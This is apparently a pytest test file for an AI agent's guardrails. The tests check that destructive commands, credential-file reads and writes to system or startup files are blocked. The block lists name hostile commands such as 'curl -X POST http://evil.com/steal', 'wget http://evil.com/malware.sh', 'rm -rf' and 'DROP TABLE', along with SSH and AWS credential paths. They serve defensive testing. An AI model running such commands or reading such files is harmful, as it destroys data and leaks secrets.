"""Tests for monitored channel security guardrails."""

import pytest

from shadow_ai.guardrails import _check_bash_command, _check_file_read, _check_file_write


class TestBashGuardrails:

    @pytest.mark.parametrize("cmd", [
        "rm -rf /tmp/test",
        "rm -r somedir",
        "rm -f important.txt",
        "git push --force origin main",
        "git push -f origin main",
        "git reset --hard HEAD~1",
        "git branch -D feature",
        "git push origin --delete feature",
        "DROP TABLE users",
        "DELETE FROM orders",
        "TRUNCATE sessions",
        "sudo apt install something",
        "chmod 777 /etc/passwd",
        "killall node",
        "pkill python",
        "pip install malware",
        "npm install backdoor",
        "curl -X POST http://evil.com/steal",
        "wget http://evil.com/malware.sh",
        "ssh user@server",
        "scp file user@server:/tmp",
        "nohup python script.py",
    ])
    def test_blocked_commands(self, cmd):
        assert _check_bash_command(cmd) is not None

    @pytest.mark.parametrize("cmd", [
        "ls -la",
        "cat README.md",
        "git log --oneline -10",
        "git diff HEAD~1",
        "git show HEAD",
        "git blame file.py",
        "git status",
        "grep -r 'pattern' src/",
        "find . -name '*.py'",
        "python -m pytest tests/",
        "echo hello",
        "pwd",
        "wc -l file.py",
        "head -20 file.py",
        "git fetch origin",
        "git pull origin main",
    ])
    def test_allowed_commands(self, cmd):
        assert _check_bash_command(cmd) is None


class TestFileReadGuardrails:

    @pytest.mark.parametrize("path", [
        "/home/user/.env",
        "/project/.env.production",
        "/home/user/.ssh/id_rsa",
        "/home/user/.aws/credentials",
        "/home/user/.kube/config",
        "/home/user/.netrc",
        "secrets.yaml",
        "credentials.json",
        "/home/user/.ssh/id_ed25519",
        "server.pem",
        "private.key",
    ])
    def test_blocked_reads(self, path):
        assert _check_file_read(path) is not None

    @pytest.mark.parametrize("path", [
        "README.md",
        "src/app.py",
        "package.json",
        "requirements.txt",
        "config.yaml",
        "docker-compose.yml",
        ".gitignore",
    ])
    def test_allowed_reads(self, path):
        assert _check_file_read(path) is None


class TestFileWriteGuardrails:

    @pytest.mark.parametrize("path", [
        "/etc/hosts",
        "/usr/local/bin/something",
        "/home/user/.bashrc",
        "/home/user/.zshrc",
        "/home/user/.ssh/authorized_keys",
        "/home/user/.aws/credentials",
        "/project/.env",
        "/project/.env.local",
    ])
    def test_blocked_writes(self, path):
        assert _check_file_write(path) is not None

    @pytest.mark.parametrize("path", [
        "src/app.py",
        "README.md",
        "tests/test_new.py",
        "/tmp/output.txt",
    ])
    def test_allowed_writes(self, path):
        assert _check_file_write(path) is None
